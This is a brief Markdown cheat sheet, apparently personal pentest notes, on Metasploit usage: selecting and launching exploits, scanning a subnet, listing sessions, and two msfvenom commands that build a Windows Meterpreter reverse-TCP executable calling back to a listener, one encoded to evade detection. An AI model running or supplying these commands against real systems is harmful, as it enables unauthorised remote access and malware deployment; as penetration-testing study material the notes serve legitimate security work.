# Metasploit 

Metasploit is a popular tool used by pentest expert.

Link: https://github.com/security-cheatsheet/metasploit-cheat-sheet

## Common Usage of nmap commands I used


```
msfconsole
```

### Part 1 

```
msf > search [regex]
msf > use exploit/[ExploitPath]
msf > set PAYLOAD [PayloadPath]
msf > show options
msf > set [Option] [Value]
msf > exploit 
```

### Part 2 

```
msf > use auxiliary/scanner/portscan/tcp
msf > set RHOSTS 10.10.10.0/24
msf > run
```

### Part 3 

The msfvenom tool can be used to generate Metasploit payloads (such as Meterpreter) as standalone files and optionally encode them. This tool replaces the former msfpayload and msfencode tools. Run with ‘'-l payloads’ to get a list of payloads.

```
$ msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST=10.1.1.1 LPORT=4444 > met.exe
```

```
$ msfvenom -p windows/meterpreter/reverse_tcp -i 5 -e x86/shikata_ga_nai -f exe LHOST=10.1.1.1 LPORT=4444 > mal.exe
```

### Part 4 

```
msf > jobs –l
msf > sessions -l

```




